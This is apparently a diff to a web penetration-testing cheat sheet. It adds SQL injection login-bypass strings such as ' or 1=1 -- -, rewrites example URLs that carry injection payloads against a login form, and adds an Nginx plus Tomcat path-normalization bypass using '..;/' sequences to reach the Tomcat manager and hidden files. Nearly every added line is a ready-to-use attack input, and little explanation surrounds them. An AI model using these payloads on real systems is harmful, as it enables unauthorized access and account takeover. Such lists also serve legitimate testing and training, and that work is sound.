@@ -71,6 +71,7 @@ Browse
 Follow links, paths, clues
 View Source (Ctrl-U)
 Find package type (Wordpress, Drupal, etc)
+Custom Error Pages = App Hint
 Hidden comments
 Tweak Comments: Firefox > Inspect Element > R.Click "Edit as HTML" 
 
@@ -232,6 +233,7 @@ hello " ; < >
 Login Bypass
 
 ' or 1=1 -- 
+' or 1=1 -- -
 " or 1=1 --  
 ' or 1=1;# 
 " or 1=1 #  
@@ -249,9 +251,19 @@ PASS:  */ =1 --
 USER: admin' or 1=1 # 
 PASS: admin' or 1=1 #  
 
-http://mongo.so/?username=admin' or 1=1--%00 
-http://mongo.so/?username=admin&password=admin&submit=Submit 
-http://mongo.so/?username=admin&password=admin&submit=Submit' or 1=1 -- 
+http://mongo/?username=admin' or 1=1--%00 
+http://mongo/?username=admin&password=admin&submit=Submit 
+http://mongo/?username=admin&password=admin&submit=Submit' or 1=1 -- 
+
+=================================== 
+Nginx + Tomcat Path Normalization Bypass Trick
+
+http://site/manager/
+http://site/;name=hello/manager/
+http://site/app/test.html
+http://site/app/..;/manager/
+http://site/app/..;/index.jsp
+http://site/app/..;/app2/secret.html
 
 
 =================================== 
